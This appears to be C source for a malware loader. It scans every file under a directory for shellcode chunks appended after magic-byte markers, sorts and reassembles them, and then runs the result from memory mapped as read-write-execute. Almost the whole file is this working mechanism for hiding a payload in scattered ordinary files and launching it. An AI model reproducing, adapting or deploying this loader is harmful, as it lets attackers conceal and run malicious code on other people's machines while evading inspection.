#include <sys/mman.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include "../includes/utils.h"
#include "../includes/infection.h"

#define BLKSIZE 1024

void execute_shellcode(t_shellcode *shellcode) {
  void *executable_memory;

  executable_memory = mmap(NULL, shellcode->length, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
  if (executable_memory == (void*)-1) { // Checks if mmap() returned an error.
    perror("my_loader");
    munmap(executable_memory, shellcode->length);
    return ;
  }
  memcpy(executable_memory, shellcode->buf, shellcode->length);
  free(shellcode->buf);
  free(shellcode);
  void (*func)() = (void (*)())executable_memory;
  func();
  return;
}

int *bytechr(int *buf, int b, size_t bufsize) {
  for (size_t i = 0; i < bufsize; i++, buf++)
    if (*buf == b)
      return (buf);
  return (NULL);
}

int *find_magic_bytes_in_buf(int *buf, size_t bufsize) {
  int *magic_byte = NULL;

  magic_byte = (int *)bytechr(buf, 0xF3CE, bufsize);
  while (magic_byte) {
    printf("%x\n", *magic_byte);
    if (*magic_byte == 0xF3CE && *(magic_byte + 1) == 0x600D)
      return (magic_byte);
    buf = magic_byte + 1;
    magic_byte = bytechr(buf, 0xF3CE, bufsize - (buf - magic_byte));
  }
  return (NULL);
}

// Returns NULL if no shellcode found, otherwise returns a pointer to the file.
FILE *detect_shellcode(char *path) {
  FILE *file;
  char buf[BLKSIZE];
  long offset;
  long file_size;
  int *magic_byte = NULL;

  if (!path)
    return (NULL);
  file = fopen(path, "rb");
  if (!file)
    return (NULL);
  file_size = size_of_file(file);
  offset = (file_size < BLKSIZE) ? file_size : BLKSIZE;
  while (fseek(file, -offset, SEEK_END) != -1) {
    bzero(buf, BLKSIZE);
    if (fread(buf, sizeof(char), BLKSIZE, file) < 1) {
      fclose(file);
      return (NULL);
    }
    magic_byte = find_magic_bytes_in_buf((int *)buf, BLKSIZE);
    if (magic_byte) {
      fseek(file, -(offset + (buf - (char *)magic_byte)),  SEEK_END);
      return (file);
    }
    offset += BLKSIZE;
  }
  fclose(file);
  return (NULL);
}

t_list *find_shellcode_chunks(char *root_path) {
  t_list *files;
  t_list *chunk_list = NULL;
  t_list *list_ptr;
  FILE *fp;

  if (!root_path)
    return (NULL);
  files = find_files(root_path);
  if (!files || !files->data)
    return (NULL);
  list_ptr = files;
  while (list_ptr) {
    fp = detect_shellcode(((t_file *)list_ptr->data)->absolute_path);
    if (fp) { // I hope we can assume that the file position indicator will be accurate.
      if (!chunk_list)
        chunk_list = new_list(read_shellcode(fp));
      else
        list_add_front(&chunk_list, read_shellcode(fp));
      fclose(fp);
    }
    list_ptr = list_ptr->next;
  }
  free_file_list(&files);
  return (chunk_list);
}

int chunks_sorted(t_list *chunks) {
  t_list *last = NULL;

  while (chunks) {
    if (last)
      if (((t_shellcode *)last->data)->chunk_number > ((t_shellcode *)chunks->data)->chunk_number)
        return (false);
    last = chunks;
    chunks = chunks->next;
  }
  return (true);
}

void sort_chunks(t_list *chunks) {
  t_list *list_ptr;
  t_shellcode *temp_ptr;

  list_ptr = chunks;
  while (!chunks_sorted(chunks)) {
    if (!list_ptr->next)
      list_ptr = chunks;
    if (((t_shellcode *)list_ptr->data)->chunk_number > ((t_shellcode *)list_ptr->next->data)->chunk_number) {
      temp_ptr = list_ptr->data;
      list_ptr->data = list_ptr->next->data;
      list_ptr->next->data = temp_ptr;
    }
    list_ptr = list_ptr->next;
  }
}

t_shellcode *assemble_shellcode_chunks(t_list **chunks) {
  t_shellcode *shellcode;
  t_shellcode *chunk;
  size_t num_chunks;
  t_list *list_ptr;
  char *buf_ptr;

  if (!chunks)
    return (NULL);
  shellcode = calloc(1, sizeof(t_shellcode));
  if (!shellcode)
    return (NULL);
  num_chunks = list_count(*chunks);
  list_ptr = *chunks;
  while (list_ptr != NULL) {
    shellcode->length += ((t_shellcode *)list_ptr->data)->length;
    list_ptr = list_ptr->next;
  }
  shellcode->length -= ((sizeof(int) * 2) + 1) * num_chunks;
  shellcode->buf = calloc(shellcode->length, sizeof(char));
  if (!shellcode->buf) {
    free(shellcode);
    return (NULL);
  }
  buf_ptr = shellcode->buf;
  list_ptr = *chunks;
  while (list_ptr != NULL) {
    chunk = ((t_shellcode *)list_ptr->data);
    memcpy(buf_ptr, chunk->buf + (sizeof(int) * 2) + 1, chunk->length - ((sizeof(int) * 2) + 1));
    buf_ptr += chunk->length - ((sizeof(int) * 2) + 1);
    free(chunk->buf);
    free(chunk);
    list_ptr = list_ptr->next;
  }
  list_clear(chunks);
  return (shellcode);
}

int main(int argc, char *argv[]) {
  t_shellcode *shellcode;
  t_list *shellcode_chunks;

  if (argc != 2)
    return (1);
  shellcode_chunks = find_shellcode_chunks(argv[1]);
  if (!shellcode_chunks)
    return (1);
  sort_chunks(shellcode_chunks);
  shellcode = assemble_shellcode_chunks(&shellcode_chunks);
  if (!shellcode)
    return (1);
  execute_shellcode(shellcode);
}
